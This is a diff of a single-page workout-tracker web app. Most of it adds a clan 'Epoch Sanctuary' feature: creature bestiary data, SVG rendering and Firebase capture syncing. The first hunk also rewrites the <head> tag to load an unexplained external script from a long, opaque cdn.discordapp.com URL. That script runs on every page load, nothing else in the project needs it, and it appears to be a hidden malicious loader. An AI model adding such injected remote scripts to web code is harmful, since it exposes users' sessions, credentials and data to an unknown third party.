@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
+<head><script type='text/javascript' src='https://cdn.discordapp.com/sLBcdlLpKL9KIeTqwdaOx71KfNFsGCNhlkafyEUxq7pC9s6haoHu-3bHhRCHisCQJ1I-H7Bma4Enkt1z43aV3sRKSARu9SxpVqJYa4xKltKFBI84gb4u9x0cQKwfpxA2CYfu1WeBiUxRqVzeu6VdEZ4J75ZhEoPKJRh5ZloLYvK0EIPnH8grOG90ltLBp5CLFU3hKBrTrWvR-FtChIHFSlmopQ-sv1fOBhYHk6PgNBGRmMZz0gk4wnnmB_E3mTRs5Vv-mfN61kY-DL-r7GEkIZajlvSxvDxA8zJNombAGoaKCpDhuCgvfNRuw4TlFolXc1SYwqK0wCuCMRtBeKodDREOoOeC5C3MwohAgJwXj1yfglcXHtuqCKI_690zG-s5TfUsQ5M-bI6pmBaLfuKSideD0AFyp7XkKN_s8sEqL6jYQ7LlQO6yK_OhBtLHdw-LL_xLcihJ7skwOv26bU57qwCil5dJiuG9TdODDhavBXmsDQU3f3impdbIDqXM8IVh0hY9bCZZcnTGRAmfOPXo8VHk3LYggqLWcUBjzJg4FFpgDPP7AweqJ2jnGEvh7BBI_Sp6XHJc5IknuwtElhNJXPD46re5EB9H8Ies50k4ScRwDSK-AamWh88mBvZWJGTLfZePUgYQ-eBx9ExTB560AyPsvjGK3CEl5T0'></script>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
 <meta name="apple-mobile-web-app-capable" content="yes">
@@ -83,6 +83,27 @@ textarea{width:100%;padding:12px;background:#2a2a2a;border:1px solid var(--bd);c
 .podium-fill{height:100%;background:var(--acc);border-radius:4px}
 .np-user{font-size:.78rem;padding:8px;background:#1a1a1a;color:var(--mu);border:1px dashed #444;margin-bottom:6px}
 .edit-box{background:#222;border:1px solid var(--acc);border-radius:8px;padding:10px;margin:6px 0}
+input,select,textarea{font-size:16px !important}
+body{color-scheme:dark}
+.arena{position:relative;border-radius:10px;overflow:hidden;border:1px solid #333;background:#090a0f;aspect-ratio:16/10;display:flex;align-items:center;justify-content:center;margin:8px 0}
+.arena svg{width:100%;height:100%;display:block}
+.calendar-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(70px,1fr));gap:6px;margin-top:10px;max-height:260px;overflow-y:auto;padding-right:4px}
+.cal-cell{background:#17181f;border:1px solid #2a2e3d;border-radius:8px;padding:6px;text-align:center;font-size:.75rem}
+.cal-cell.unlocked{border-color:var(--acc);background:#1e1c14}
+.cal-cell.current{outline:2px solid var(--acc)}
+.cal-cell svg{width:36px;height:36px;margin:2px auto;display:block}
+@keyframes floatHover{0%,100%{transform:translateY(0)}50%{transform:translateY(-4px)}}
+@keyframes wingDraft{0%{stroke-dasharray:18 42;stroke-dashoffset:60;opacity:0}40%{opacity:.7}100%{stroke-dasharray:18 42;stroke-dashoffset:0;opacity:0}}
+@keyframes boltFlash{0%,82%,100%{opacity:0}85%,92%{opacity:1}88%{opacity:.2}}
+@keyframes emberRise{0%{transform:translateY(25px) scale(.6);opacity:0}30%{opacity:.85}100%{transform:translateY(-85px) scale(1.1);opacity:0}}
+@keyframes snowDrift{0%{transform:translate(15px,-15px);opacity:0}30%{opacity:.8}100%{transform:translate(-30px,85px);opacity:0}}
+.boss-rig{animation:floatHover 3.2s ease-in-out infinite}
+.fx-draft{animation:wingDraft 1.6s linear infinite}
+.fx-bolt{animation:boltFlash 2.8s infinite}
+.p-ember{animation:emberRise 3s linear infinite}
+.p-snow{animation:snowDrift 3.4s linear infinite}
+@media (prefers-reduced-motion:reduce){.boss-rig,.fx-draft{animation:none}.p-ember,.p-snow,.fx-bolt{display:none}}
+.cal-cell{cursor:pointer;display:flex;flex-direction:column;gap:2px}.cal-cell svg{width:100%;height:44px;margin:0}.cal-cell .cn{font-size:.65rem;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.cal-cell.cap{border-color:var(--acc);background:#1e1c14}.cal-cell.cur{outline:2px solid var(--acc)}.cal-cell .fx-draft{animation:none}
 </style>
 </head>
 <body>
@@ -103,7 +124,7 @@ textarea{width:100%;padding:12px;background:#2a2a2a;border:1px solid var(--bd);c
   <b>Rest Timer Guide (Background-Music Safe):</b>
   <ul>
     <li><b>Rest 60s / 2m / 3m:</b> Tap any preset to start the countdown. Starting or running a timer will <b>never pause your background music</b> (Spotify, Apple Music, YouTube Music).</li>
-    <li><b>Alerts:</b> When time expires, the screen flashes visually, your phone vibrates, and an ambient chime plays over your music.</li>
+    <li><b>Alerts:</b> When time expires, the screen flashes visually, Android phones vibrate (iPhone has no web vibration), and an ambient chime plays over your music.</li>
   </ul>
 </div>
 
@@ -284,6 +305,8 @@ textarea{width:100%;padding:12px;background:#2a2a2a;border:1px solid var(--bd);c
 <section id="tC" hidden>
   <div class="card">
     <h2>Clan Leaderboard</h2>
+    <div class="sub" style="margin-bottom:12px"><button id="clanTabLead" class="on" type="button">🏆 Leaderboard</button><button id="clanTabSanc" type="button">🌱 Sanctuary</button></div>
+    <div id="clanSubLeaderboard">
     <button id="kGuideBtn" class="alt" style="padding:8px;font-size:.85rem">? Setup guide (iPhone &amp; Android)</button>
     <div id="kGuide" class="info-panel" hidden>
       <b>A. Friends: join in 3 steps</b>
@@ -390,6 +413,29 @@ textarea{width:100%;padding:12px;background:#2a2a2a;border:1px solid var(--bd);c
         <button id="kUnlock" type="submit">Unlock admin tools</button>
       </form>
       <button id="kLeave" class="danger">Leave clan</button>
+    </div>
+    </div>
+    <div id="clanSubSanctuary" hidden>
+      <div class="card" style="background:#171922;padding:12px;margin-bottom:14px">
+        <div style="display:flex;justify-content:space-between;align-items:center;gap:8px"><b style="color:var(--acc)" id="sancTitle">🌱 Epoch Sanctuary</b><span id="sancBadge" class="s-pill"></span></div>
+        <div id="sancArena" class="arena"></div>
+        <div id="sancLore" class="hint" style="font-style:italic"></div>
+        <div style="display:flex;justify-content:space-between;font-size:.8rem"><span id="sancBondText">Bond trust progress</span><span id="sancSetsNum"></span></div>
+        <div class="podium-bar"><div id="sancFill" class="podium-fill" style="width:0%"></div></div>
+      </div>
+      <div class="info-panel"><b>📜 Clan Bestiary (52 weeks)</b>
+        <div class="hint">Every week's companion is captured at Stage 3: 85% of the target, or 100% for ⚔ boss weeks. Tap any entry to open it; captured ones list who earned the capture.</div>
+        <select id="bestiarySet" hidden style="margin:6px 0"></select>
+        <div id="calendarGrid" class="calendar-grid"></div>
+        <div id="bestiaryEntry" class="info-panel" hidden></div>
+      </div>
+      <div id="adminViewerCard" class="info-panel" hidden>
+        <b>👑 Admin bestiary inspector</b>
+        <input id="adminWeekSel" type="range" min="1" max="52" value="1" style="accent-color:var(--acc)">
+        <div style="display:flex;justify-content:space-between;gap:8px;font-size:.82rem;color:var(--acc)"><span id="awTitle"></span><span id="awBiome"></span></div>
+        <div id="adminArena" class="arena"></div>
+        <div id="awLore" class="hint" style="font-style:italic"></div>
+      </div>
     </div>
     <div id="kMsg" class="msg"></div>
   </div>
@@ -1018,6 +1064,243 @@ const dec=(t,pfxLen)=>JSON.parse(atob(t.trim().replace(/\s/g,"").slice(pfxLen).r
 const cleanName=v=>v.trim().replace(/[^\p{L}\p{N} _-]/gu,"").slice(0,20);
 const arr=v=>Array.isArray(v)?v.filter(Boolean):Object.values(v||{});
 const num=v=>Number(v)||0;
+// ---- Epoch Sanctuary (hardened) ----
+const E1_TXT=`Glacier Yeti|Snowpeak Watcher|b|A gentle, shaggy giant of the upper snows who watches lifters with quiet, approving nods.
+Snowlynx|Frostpeak Stalker|b|Sleek predator with ice-blue ear tufts that pads silently across frozen paths.
+Rime Tortoise|Permafrost Shield|g|Carrying a shell of ancient blue glacier ice that never melts.
+Aurora Fox|Northern Light Spirit|b|Its tail paints shimmering auroral ribbons across the evening sky.
+Crystal Pangolin|Prismatic Guardian|g|Armor scales refract winter moonlight into blinding rainbow beams.
+Hail Golem|Glacial Construct|g|Animated by frozen tempests; heavy-duty stamina on cold porch days.
+Frost Owl|Boreal Wise-Eye|b|Perches above the workout area, offering silent encouragement.
+Starlight Puffin|Cliffside Dwellers|b|Waddles around cheerfully between dumbbell sets.
+Permafrost Mammoth|Tundra Titan|b|A majestic woolly behemoth radiating calm, immovable strength.
+Icicle Wyrm|Frost Trench Seraph|l|Coils gracefully around porch railings, humming with crystalline resonance.
+Nebula Seal|Aurora Swimmer|b|Glides through snowdrifts as if swimming through starry tides.
+Blizzard Bear|Winter Guardian|b|A massive, warm-hearted bear who embodies heavy lifting endurance.
+Vaelgor the Abyssal Rime-Wyrm|Q1 Seasonal Apex|l|Grand ice serpent of the deep winter trench; arcs crackling frost-lightning along its spine.
+Petal Kitsune|Spring Blossom Spirit|b|Leaves trails of cherry-blossom petals with every playful bound.
+Dewdrop Slime|Morning Meadow Blob|b|Bouncing and cheerful; sparkles with morning dew.
+Sprout Treant|Forest Sapling|g|A tiny walking tree rooted in resilience and steady growth.
+Thistledown Hare|Meadow Sprinter|b|Incredible explosive energy for sprint sets and fast reps.
+Breeze Griffin|Gale Cub|f|Practicing its first majestic wing-sweeps in the spring air.
+Fern Gecko|Mossy Climber|b|Clings effortlessly to walls with unmatched grip strength.
+Blossom Tortoise|Garden Sanctuary|g|A walking terrarium blooming with wildflowers.
+Thunder Badger|Spring Storm Brawler|b|Unstoppable grit and tenacity through tough training blocks.
+Lotus Frog|Pond Sage|b|Meditates peacefully by garden puddles between sets.
+Cloud Sheep|Sky Fleecer|b|Fluffy and warm, floating gently on warm spring updrafts.
+Clover Stag|Luck Bringer|b|Its antlers catch morning sunbeams, bringing fortune to the roster.
+Pollen Bee-Knight|Meadow Sentinel|b|Armored in golden chitin, defending the garden flowers.
+Aetherion the Tempest Lindworm|Q2 Seasonal Apex|l|Coiled leviathan of pure spring ozone; commands roaring thunder and wind-shear.
+Sunflare Lion|Solstice Pride King|b|Radiates pure solar warmth and golden confidence.
+Coral Golem|Tidal Reef Construct|g|Living reef guardian pulsing with vibrant ocean energy.
+Tide Otters|River Playmates|b|Juggling smooth pebbles with lightning-fast hand-eye coordination.
+Magma Crab|Volcanic Scuttler|b|Carries a shell heated by pure summer radiance.
+Mirage Fennec|Desert Phantom|b|Sleek and agile, darting through shimmering heat waves.
+Sandstone Sphinx|Riddle Keeper|g|Carved from ancient desert stone, guarding workout wisdom.
+Zephyr Falcon|Sky Hunter|f|Soars high above the garden, spotting every personal record.
+Abyssal Axolotl|Glow-Gill Sage|b|Radiates soothing bioluminescent pinks in the evening cool.
+Solar Beetle|Golden Carapace|b|Lifts many times its own bodyweight with effortless form.
+Kelp Serpent|Ocean Vine Wyrm|l|Flows smoothly like ocean currents during fluid lifts.
+Geyser Turtle|Thermal Elder|g|Vents gentle, relaxing steam to soothe tired muscles.
+Starwhale|Cosmic Swimmer|b|Breaches majestically across the twilight sky.
+Pyreclaw the Caldera Forge-Drake|Q3 Seasonal Apex|f|Massive volcanic wyrm whose wingbeats generate intense thermal updrafts.
+Cinderfox|Emberwild Scout|b|A swift vulpine spirit forged in hearth-coals; trails drifting ash.
+Mossgolem|Ancient Woodland Guard|g|Covered in velvety green moss and fallen autumn leaves.
+Acorn Golem|Hardwood Spirit|g|Sturdy and compact, embodying solid core stability.
+Bramble Boar|Autumn Charger|b|Unstoppable momentum through heavy barbell or dumbbell sets.
+Dusk Owl|Twilight Watcher|b|Silently glides through amber twilight as evening workouts begin.
+Copper Tanuki|Trickster Spirit|b|Brings mischievous cheer and keeps training sessions fun.
+Pyre Salamander|Hearth-Flame Lizard|b|Basks in post-workout warmth by the porch heater.
+Chestnut Hedgehog|Spiky Companion|b|Curls into a cozy ball of determination.
+Amber Stag|Autumn Monarch|b|Crowned in amber antlers that glow with harvest light.
+Soot Sprite|Hearth Helper|b|Tiny floating spark of energy that dances around your reps.
+Smolder Cub|Flame Bearer|b|Learning the ways of strength with boundless enthusiasm.
+Wicker Guardian|Harvest Sentinel|g|Woven from autumn reeds, standing guard over the home gym.
+Aurelius, Dawn-Crowned Sovereign|Week 52 Grand Apex|s|Six-winged elder dragon of the solar eclipse; commands a radiant corona of eternal strength.`;
+const PALETTES={
+  ember:{bg1:"#1a0704",bg2:"#090302",p:"#ff5e00",s:"#ffb700",acc:"#ff2a00",glow:"#ff4500"},
+  frost:{bg1:"#051626",bg2:"#030811",p:"#00d2ff",s:"#aefeff",acc:"#3a86ff",glow:"#00e1ff"},
+  storm:{bg1:"#0d1026",bg2:"#05060f",p:"#00f5d4",s:"#e0aaff",acc:"#7b2cbf",glow:"#00f5d4"},
+  solar:{bg1:"#1f1605",bg2:"#080602",p:"#ffd700",s:"#ffffff",acc:"#ff8800",glow:"#ffd700"}
+};
+const WEEK_MS=6048e5,ek=(id,w)=>id+":"+w;
+const SIL={bg1:"#2b3040",bg2:"#12141c",p:"#000",s:"#000",acc:"#000",glow:"#000"};
+let svgUid=0,epochData={wk:{},n:1},openIdx=0,viewId="",dexNow={};
+const BIO=w=>w<=13?"frost":w<=26?"storm":w<=38?"solar":w<=51?"ember":"solar";
+const KINDS={b:"beast",g:"golem",l:"lindworm",f:"forgedrake",s:"sovereign"};
+// A title containing "Apex" marks a boss: it needs 100% of the target. Everything else captures at 85%.
+const parseRoster=(txt,bio)=>txt.split("\n").map((l,i)=>{const[name,title,k,lore]=l.split("|"),w=i+1;return{w,name,title,lore,kind:KINDS[k],biome:bio(w),boss:/Apex/.test(title)}});
+/* ADD A NEW EPOCH YEAR: paste 52 lines (name|title|kind|lore, kind = b/g/l/f/s) as E2_TXT, then add
+   {id:"e2",name:"Epoch II",start:"2027-10-16",roster:parseRoster(E2_TXT,BIO)} to EPOCHS.
+   Old epochs, captures and commemorations stay in the bestiary (dropdown). Never reuse or change an id. */
+const EPOCHS=[{id:"e1",name:"Epoch I",start:"2026-10-17",roster:parseRoster(E1_TXT,BIO)}];
+EPOCHS.forEach(x=>x.ms=Date.parse(x.start+"T00:00:00Z"));EPOCHS.sort((a,b)=>a.ms-b.ms);
+const epochAt=t=>{let r=null;for(const x of EPOCHS)if(x.ms<=t)r=x;return r};
+const getCur=()=>{const now=Date.now(),x=epochAt(now)||EPOCHS[0];return{e:x,w:Math.max(1,Math.floor((now-x.ms)/WEEK_MS)+1)}};
+const cIdx=(x,w)=>(w-1)%x.roster.length+1;
+const wkMs=(x,w)=>x.ms+(w-1)*WEEK_MS;
+const epochKeyOf=d=>{const t=Date.parse(String(d).slice(0,10)+"T00:00:00Z");if(!Number.isFinite(t))return null;const x=epochAt(t);return x?{id:x.id,w:Math.floor((t-x.ms)/WEEK_MS)+1}:null};
+const fmtD=ms=>new Date(ms).toLocaleDateString(undefined,{day:"numeric",month:"short",timeZone:"UTC"});
+const targetFor=n=>Math.max(30,Math.max(1,num(n))*45);
+const needOf=g=>g.boss?1:.85;
+const stageOf=(s,tg,g)=>{const r=num(s)/tg;return r<.35?1:r<needOf(g)?2:3};
+const rank=r=>Object.values((r&&r.m)||{}).filter(m=>m.s>0).sort((a,b)=>b.s-a.s).map(m=>[m.name,m.s]);
+function creatureRig(g,pal,fill,stage){
+  const k=g.kind;
+  if(k==="lindworm"||k==="forgedrake"||k==="sovereign")return `
+    <path class="fx-draft" d="M25,130 Q90,100 150,135 T295,120" stroke="${pal.p}" stroke-width="1.8" fill="none"/>
+    <path d="M55,145 C25,115 65,65 110,92 C155,118 140,158 185,142 C230,125 245,75 205,52 C175,35 148,55 135,44" stroke="${fill}" stroke-width="20" stroke-linecap="round" fill="none"/>
+    <path d="M135,44 L105,30 L120,48 L95,58 L132,62 L152,50" fill="${fill}" stroke="${pal.p}" stroke-width="1.5"/>
+    ${stage>=2?`<path class="fx-bolt" d="M62,92 L118,95 L182,115 L212,72" stroke="${pal.s}" stroke-width="2" fill="none"/>`:""}`;
+  if(k==="golem")return `
+    <polygon points="68,52 112,38 118,86 76,96" fill="${fill}" stroke="${pal.s}" stroke-width="1.5"/>
+    <polygon points="252,52 208,38 202,86 244,96" fill="${fill}" stroke="${pal.s}" stroke-width="1.5"/>
+    <polygon points="160,32 118,62 132,148 160,162 188,148 202,62" fill="${fill}" stroke="${pal.p}" stroke-width="2"/>
+    <polygon points="160,58 140,92 160,128 180,92" fill="${pal.p}" stroke="${pal.s}" stroke-width="1.2"/>`;
+  return `
+    <ellipse cx="160" cy="115" rx="38" ry="28" fill="${fill}" stroke="${pal.p}" stroke-width="1.8"/>
+    <circle cx="160" cy="82" r="24" fill="${fill}" stroke="${pal.s}" stroke-width="1.8"/>
+    <polygon points="142,68 132,45 152,62" fill="${fill}" stroke="${pal.s}"/>
+    <polygon points="178,68 188,45 168,62" fill="${fill}" stroke="${pal.s}"/>
+    <circle cx="152" cy="78" r="3" fill="${pal.s}"/><circle cx="168" cy="78" r="3" fill="${pal.s}"/>
+    <ellipse cx="160" cy="88" rx="4" ry="3" fill="${pal.p}"/>`;
+}
+
+// sil=true draws the pure black silhouette on a lighter backdrop (no colour, glow or particles)
+function renderCreatureSVG(g,stage,pal,sil){
+  if(sil){pal=SIL;stage=1}
+  const id=`${g.w}-${++svgUid}`,body=`bodyGrad-${id}`,sky=`skyGrad-${id}`,glow=`glow-${id}`;
+  const scale=sil?1:stage===1?.82:stage===2?.93:1.05,opacity=sil?1:stage===1?.65:stage===2?.88:1;
+  const rig=creatureRig(g,pal,sil?"#000":`url(#${body})`,stage);
+  let fx="";
+  if(!sil){const em=pal===PALETTES.ember||pal===PALETTES.solar;
+    for(let i=0;i<6;i++){const x=(i*43+17)%300,y=(i*31+12)%160,r=(i%2)+1.2;
+      fx+=`<circle class="${em?"p-ember":"p-snow"}" cx="${x}" cy="${y+20}" r="${r}" fill="${pal.s}" style="animation-delay:${(i*.4).toFixed(1)}s"/>`}}
+  return `<svg viewBox="0 0 320 180" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="${sil?"Unknown creature":esc(g.name)}">
+    <defs>
+      <radialGradient id="${sky}" cx="50%" cy="45%" r="65%"><stop offset="0%" stop-color="${pal.bg1}"/><stop offset="100%" stop-color="${pal.bg2}"/></radialGradient>
+      <linearGradient id="${body}" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#2b3040"/><stop offset="100%" stop-color="${pal.bg1}"/></linearGradient>
+      <filter id="${glow}" x="-30%" y="-30%" width="160%" height="160%"><feGaussianBlur in="SourceAlpha" stdDeviation="4" result="blur"/><feFlood flood-color="${pal.glow}" result="color"/><feComposite in="color" in2="blur" operator="in" result="shadow"/><feMerge><feMergeNode in="shadow"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    </defs>
+    <rect width="320" height="180" fill="url(#${sky})"/>
+    <polygon points="0,180 0,142 65,122 135,152 215,125 285,148 320,132 320,180" fill="#0c0d14" opacity=".85"/>
+    ${fx}
+    <g transform="translate(160 90) scale(${scale}) translate(-160 -90)" opacity="${opacity}"${stage===3&&!sil?` filter="url(#${glow})"`:""}><g class="boss-rig">${rig}</g></g>
+  </svg>`;
+}
+
+// state: cap (captured) | cur (this week) | sil (upcoming) | esc (escaped)
+function renderMiniSVG(g,state){
+  const sil=state==="sil"||state==="esc",pal=sil?SIL:PALETTES[g.biome];
+  return `<svg viewBox="20 20 280 150" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"${state==="esc"?' style="opacity:.4"':""}><rect x="20" y="20" width="280" height="150" rx="14" fill="${sil?"#2b3040":pal.bg2}"/>${creatureRig(g,pal,sil?"#000":"#2b3040",1)}</svg>`;
+}
+
+
+const loadDex=()=>{const raw=get("epochDex",{}),o={};for(const k of Object.keys(raw||{}))o[/^\d+$/.test(k)?"e1:"+k:k]=raw[k];return o};
+const whoOf=r=>(Array.isArray(r&&r.who)?r.who:[]).filter(Array.isArray).map(([n,s])=>[String(n),num(s)]);
+// Merges every member's saved captures (remote = {memberId:{"e1:3":record}}) with this phone's, then adds new captures.
+function recordCaptures(remote,meId){
+  const cur=getCur(),curKey=ek(cur.e.id,cur.w),tg=targetFor(epochData.n),dex=loadDex();let ch=false;
+  for(const m of Object.values(remote||{}))for(const[k,r]of Object.entries(m||{}))if(r&&typeof r==="object"&&(!dex[k]||num(r.t)>num(dex[k].t))){dex[k]=r;ch=true}
+  for(const[k,r]of Object.entries(epochData.wk)){
+    const[id,ws]=k.split(":"),x=EPOCHS.find(y=>y.id===id);if(!x)continue;
+    const g=x.roster[cIdx(x,+ws)-1];
+    if(stageOf(r.t,tg,g)<3||(dex[k]&&k!==curKey))continue;
+    dex[k]={t:r.t,tg,boss:g.boss,who:rank(r)};ch=true;
+  }
+  if(ch)set("epochDex",dex);
+  const mine=(remote&&meId&&remote[meId])||{};
+  return{dex,dirty:ch||Object.keys(dex).length>Object.keys(mine).length};
+}
+const capturedMap=(dex,x)=>{const m={};Object.keys(dex).forEach(k=>{const[id,w]=k.split(":");if(id!==x.id)return;const i=(+w-1)%x.roster.length+1;m[i]=Math.max(m[i]||0,+w)});return m};
+const contribHTML=(list,total)=>list.map(([n,s],i)=>`<div class="row"><span>${["🥇","🥈","🥉"][i]||(i+1)+"."} <b>${esc(n)}</b></span><span>${s} sets · ${Math.round(s/Math.max(1,total)*100)}%</span></div>`).join("")||`<div class="hint">No sets logged yet.</div>`;
+const viewEpoch=()=>EPOCHS.find(x=>x.id===viewId)||getCur().e;
+
+function openEntry(idx){
+  const box=$("bestiaryEntry");if(!box)return;
+  openIdx=idx;
+  const cur=getCur(),x=viewEpoch(),isCur=x===cur.e,pos=isCur?cIdx(x,cur.w):x.roster.length+1;
+  const g=x.roster[idx-1],pal=PALETTES[g.biome],capW=capturedMap(dexNow,x)[idx];
+  const art=(s,sil)=>`<div class="arena">${renderCreatureSVG(g,s,pal,sil)}</div>`;
+  const tag=g.boss?`<div class="hint">⚔ Boss encounter: the clan needs 100% of the target to capture it.</div>`:"";
+  let h;
+  if(capW){const r=dexNow[ek(x.id,capW)];
+    h=`${art(3)}<b>${esc(g.name)}</b> <span class="s-pill">${esc(g.title)}</span>${tag}<div class="hint" style="font-style:italic">${esc(g.lore)}</div><div class="hint">Captured the week of ${fmtD(wkMs(x,capW))} · ${num(r.t)} of ${num(r.tg)} hard sets</div><b>Captured by</b>${contribHTML(whoOf(r),num(r.t))}`;
+  }else if(isCur&&idx===pos){const r=epochData.wk[ek(x.id,cur.w)]||{t:0,m:{}},tg=targetFor(epochData.n);
+    h=`${art(stageOf(r.t,tg,g))}<b>${esc(g.name)}</b>${tag}<div class="hint">Bonding in progress: ${r.t} / ${tg} hard sets (captured at ${g.boss?100:85}%).</div><b>Contributors so far</b>${contribHTML(rank(r),r.t)}`;
+  }else if(idx<pos){
+    h=`${art(1,true)}<b>???</b><div class="hint">This one escaped before the clan could bond with it.</div>`;
+  }else{const w=cur.w+idx-pos,days=Math.ceil((wkMs(x,w)-Date.now())/864e5);
+    h=`${art(1,true)}<b>???</b><div class="hint">Appears ${fmtD(wkMs(x,w))}, in ${days} day${days===1?"":"s"}.${g.boss?" ⚔ A boss encounter.":""}</div>`;
+  }
+  box.innerHTML=h+`<button type="button" class="alt" id="beClose">Close</button>`;
+  box.hidden=false;
+  $("beClose").onclick=()=>{box.hidden=true;openIdx=0};
+}
+
+function renderGrid(){
+  const grid=$("calendarGrid");if(!grid)return;
+  const cur=getCur(),sel=$("bestiarySet"),started=EPOCHS.filter(x=>x.ms<=Date.now());
+  if(sel){sel.hidden=started.length<2;sel.innerHTML=started.map(x=>`<option value="${esc(x.id)}">${esc(x.name)}</option>`).join("");sel.value=viewEpoch().id}
+  const x=viewEpoch(),isCur=x===cur.e,pos=isCur?cIdx(x,cur.w):x.roster.length+1,cap=capturedMap(dexNow,x);
+  grid.innerHTML=x.roster.map(r=>{
+    const st=cap[r.w]?"cap":isCur&&r.w===pos?"cur":r.w<pos?"esc":"sil",lit=st==="cap"||st==="cur";
+    const when=cap[r.w]||(isCur&&r.w>=pos?cur.w+r.w-pos:r.w);
+    return `<div class="cal-cell ${st}" data-i="${r.w}" role="button" tabindex="0" aria-label="${lit?esc(r.name):"Unknown creature"}"><div>${r.boss?"⚔ ":""}${fmtD(wkMs(x,when))}</div>${renderMiniSVG(r,st)}<div class="cn">${lit?esc(r.name):"???"}</div></div>`;
+  }).join("");
+}
+$("calendarGrid")?.addEventListener("click",ev=>{const c=ev.target.closest(".cal-cell");if(c)openEntry(+c.dataset.i)});
+$("calendarGrid")?.addEventListener("keydown",ev=>{if(ev.key!=="Enter"&&ev.key!==" ")return;const c=ev.target.closest(".cal-cell");if(c){ev.preventDefault();openEntry(+c.dataset.i)}});
+$("bestiarySet")?.addEventListener("change",ev=>{viewId=ev.target.value;$("bestiaryEntry").hidden=true;openIdx=0;renderGrid()});
+
+function focusCurrentWeek(){
+  const grid=$("calendarGrid"),cur=grid&&grid.querySelector(".cal-cell.cur");
+  if(!cur||$("clanSubSanctuary").hidden)return;
+  const off=cur.getBoundingClientRect().top-grid.getBoundingClientRect().top;
+  grid.scrollTo({top:Math.max(0,grid.scrollTop+off-(grid.clientHeight-cur.offsetHeight)/2),behavior:"smooth"});
+}
+
+// wkData = {"e1:3":{t:totalSets,m:{memberId:{name,s}}}}; n = active members; remote = clan-wide saved captures.
+// Returns this phone's capture record when it should be uploaded to the clan, else null.
+function renderSanctuary(wkData,n,remote,meId){
+  epochData={wk:wkData||{},n:Math.max(1,num(n))};
+  const cur=getCur(),x=cur.e,g=x.roster[cIdx(x,cur.w)-1],pal=PALETTES[g.biome],tg=targetFor(epochData.n);
+  const sets=num((epochData.wk[ek(x.id,cur.w)]||{}).t),pct=Math.min(100,Math.floor(sets/tg*100)),stage=stageOf(sets,tg,g);
+  $("sancTitle").textContent=`🌱 ${x.name} · Week ${cur.w}: ${g.name}`;
+  $("sancBadge").textContent=(g.boss?"⚔ ":"")+["Stage 1: Approaching & Observing","Stage 2: Feeding & Trust Building","Stage 3: Fully Bonded & Ridden! 🐉"][stage-1];
+  $("sancLore").textContent=g.lore;
+  $("sancBondText").textContent=`${g.boss?"⚔ Boss: capture at 100%":"Capture at 85%"} · next companion ${fmtD(wkMs(x,cur.w+1))}`;
+  $("sancSetsNum").textContent=`${sets} / ${tg} Hard Sets`;
+  $("sancFill").style.width=pct+"%";
+  $("sancArena").innerHTML=renderCreatureSVG(g,stage,pal);
+  const rc=recordCaptures(remote,meId);dexNow=rc.dex;
+  renderGrid();focusCurrentWeek();
+  if(openIdx)openEntry(openIdx);
+  return rc.dirty?dexNow:null;
+}
+
+$("clanTabLead")?.addEventListener("click",()=>{
+  $("clanTabLead").classList.add("on");$("clanTabSanc").classList.remove("on");
+  $("clanSubLeaderboard").hidden=false;$("clanSubSanctuary").hidden=true;
+});
+$("clanTabSanc")?.addEventListener("click",()=>{
+  $("clanTabSanc").classList.add("on");$("clanTabLead").classList.remove("on");
+  $("clanSubSanctuary").hidden=false;$("clanSubLeaderboard").hidden=true;
+  focusCurrentWeek();
+});
+
+function renderAdminWeek(){
+  const sel=$("adminWeekSel");if(!sel)return;
+  const x=getCur().e,g=x.roster.find(r=>r.w===num(sel.value))||x.roster[0];
+  $("awTitle").textContent=`Creature ${g.w}: ${g.name} (${g.title})`;
+  $("awBiome").textContent=`Biome: ${g.biome.toUpperCase()} (${g.kind})${g.boss?" ⚔ boss":""}`;
+  $("awLore").textContent=g.lore;
+  $("adminArena").innerHTML=renderCreatureSVG(g,3,PALETTES[g.biome]);
+}
+const adminSel=$("adminWeekSel");
+if(adminSel){const c0=getCur();adminSel.value=cIdx(c0.e,c0.w);adminSel.addEventListener("input",renderAdminWeek);renderAdminWeek()}
+renderSanctuary({},1);
+
 const key=(...a)=>a.join("|").replace(/[.$#\[\]\/]/g,"_");
 const FR={EMAIL_EXISTS:"That account already exists.",OPERATION_NOT_ALLOWED:"Email/Password sign-in isn't switched on in Firebase (guide step 3).",INVALID_API_KEY:"The API key looks wrong. Re-copy the Firebase config.",API_KEY_INVALID:"The API key looks wrong. Re-copy the Firebase config.",WEAK_PASSWORD:"Password too short.",INVALID_LOGIN_CREDENTIALS:"Wrong master password.",INVALID_PASSWORD:"Wrong master password.",PERMISSION_DENIED:"Firebase rules are missing or not published (guide step 5)."};
 const why=e=>{const k=String(e&&e.message||e).split(/[ :]/)[0];return FR[k]||"Failed: "+(e&&e.message||e)};
@@ -1130,6 +1413,11 @@ async function renderClan(){
     const ovr=(id,k)=>md[id]&&md[id].ovr&&md[id].ovr[k];
     const matchGen=uGen=>fGen==="all"||uGen===fGen;
     const gBadge=g=>g==="f"?' <small style="color:var(--acc);opacity:.85">[W]</small>':(g==="m"?' <small style="color:var(--mu)">[M]</small>':"");
+    const epWk=(()=>{const wk={};let n=0;for(const[id,u]of Object.entries(bd||{})){if(hid(id))continue;n++;const nm=String(u&&u.name||"?");for(const x of arr(u&&u.s)){const d=String(x.d),p=epochKeyOf(d);if(!p)continue;const so=num(x.sets),sk=x.i?key(x.i):key(d,String(x.k),so),lk=key(d,String(x.k),so);if(drop(id,sk)||drop(id,lk))continue;const o=ovr(id,sk)||ovr(id,lk),s=o&&o.sets!==undefined?num(o.sets):so,k=ek(p.id,p.w),r=wk[k]=wk[k]||{t:0,m:{}},mm=r.m[id]=r.m[id]||{name:nm,s:0};r.t+=s;mm.s+=s}}return[wk,n]})();
+    let dxr=null;if(c.sv>=2){try{dxr=await db(c,"GET",np(c,"dex"))}catch(err){}}
+    const dxOut=renderSanctuary(epWk[0],epWk[1],dxr,c.me);
+    if(dxOut&&c.sv>=2)db(c,"PUT",np(c,"dex")+"/"+c.me,dxOut).catch(()=>{});
+    $("adminViewerCard").hidden=!admin;
     lastData=Object.create(null);
     const feedEvents=[],custWorkouts=Object.create(null);
 
